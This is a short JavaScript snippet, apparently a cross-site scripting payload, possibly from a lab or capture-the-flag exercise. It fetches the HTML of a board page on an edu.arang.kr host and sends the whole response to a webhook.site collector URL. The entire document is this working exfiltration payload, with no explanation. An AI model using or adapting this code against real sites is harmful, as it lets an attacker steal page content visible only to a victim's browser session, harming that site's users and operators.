fetch('http://edu.arang.kr:9103/board/0')
  .then(response => response.text())
  .then(html => {
    fetch('https://webhook.site/7c6d8599-2773-4bb4-914b-c33fd36efb97/log?data=' + encodeURIComponent(html));
  })
  .catch(err => console.error(err));
